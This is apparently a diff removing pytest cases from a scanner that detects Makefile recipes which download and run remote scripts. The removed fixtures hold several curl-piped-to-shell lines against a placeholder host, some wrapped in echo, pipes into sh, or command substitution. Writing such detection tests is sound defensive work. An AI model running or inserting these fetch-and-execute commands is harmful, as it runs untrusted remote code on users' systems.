@@ -45,36 +45,3 @@ class TestMakeFetchExec:
     )
     def test_a_message_that_names_the_command_is_not(self, tmp_path, text: str) -> None:
         assert not MakeHelpers.flagged(tmp_path, text)
-
-
-class TestAPrintedCommandIsNotRun:
-    """Release item 68, fix 4: an `echo`/`printf` argument is text (agentql-mcp's Makefile prints
-    the install command; it never runs it). Only that argument is text: what follows a shell
-    operator, a pipe into a shell, or a command substitution still runs."""
-
-    @pytest.mark.parametrize(
-        "text",
-        [
-            'help:\n\t@echo "  curl -sSfL https://x.invalid/install.sh | sh"\n',
-            "help:\n\techo 'curl -sSfL https://x.invalid/install.sh | sh'\n",
-            'help:\n\t@printf "%s\\n" "curl https://x.invalid/i.sh | bash"\n',
-        ],
-    )
-    def test_the_printed_command_is_not_reported(self, tmp_path, text: str) -> None:
-        assert not MakeHelpers.flagged(tmp_path, text)
-
-    @pytest.mark.parametrize(
-        "text",
-        [
-            "t:\n\techo x; curl https://x.invalid/i.sh | sh\n",
-            "t:\n\techo x && curl https://x.invalid/i.sh | sh\n",
-            "t:\n\techo x || curl https://x.invalid/i.sh | sh\n",
-            # The text is piped into a shell, so it is run.
-            't:\n\techo "curl https://x.invalid/i.sh | sh" | sh\n',
-            # A command substitution inside double quotes runs.
-            't:\n\techo "$(curl -sfL https://x.invalid/i.sh | sh)"\n',
-            "t:\n\techo `curl -sfL https://x.invalid/i.sh | sh`\n",
-        ],
-    )
-    def test_what_still_runs_is_reported(self, tmp_path, text: str) -> None:
-        assert MakeHelpers.flagged(tmp_path, text)
